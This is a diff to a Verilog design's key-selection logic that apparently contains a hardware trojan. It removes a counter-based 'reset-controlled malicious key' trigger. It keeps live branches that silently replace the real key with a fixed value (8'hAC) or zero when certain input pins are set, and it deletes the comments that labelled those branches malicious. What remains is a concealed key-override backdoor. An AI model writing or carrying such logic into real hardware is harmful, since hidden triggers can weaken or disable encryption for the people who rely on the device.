@@ -106,15 +106,6 @@ shift_register debug_module(
     .data_out(uo_out[7])
 );
 
-reg [$clog2(128)-1:0] reset_counter;
-
-always @(posedge clk or negedge rst_n) begin
-    if (!rst_n) begin
-        reset_counter <= 0;  // Asynchronous reset
-    end else if (ena) begin
-        reset_counter <= (reset_counter < 127) ? reset_counter + 1 : 0;
-    end
-end
 
 // Conditional key selection logic with prioritized conditions
 always @(posedge clk or negedge rst_n) begin
@@ -123,13 +114,11 @@ always @(posedge clk or negedge rst_n) begin
     end else if (ena) begin
         // Priority order for key selection
         if (ui_in[3] && !ui_in[1]) begin
-            selected_key <= 8'hAC;  // Condition 1: Always Active Malicious Key (AC)
-        end else if (ui_in[4] && reset_counter == 127) begin
-            selected_key <= 8'hDC;  // Condition 2: Reset-Controlled Malicious Key (DC)
+            selected_key <= 8'hAC;
         end else if (ui_in[5] && !ui_in[1]) begin
-            selected_key <= 8'h00;  // Condition 3: Disable Key (No Key, set to 0)
+            selected_key <= 8'h00;
         end else begin
-            selected_key <= key;    // Default condition: Use the regular key
+            selected_key <= key;
         end
     end
 end
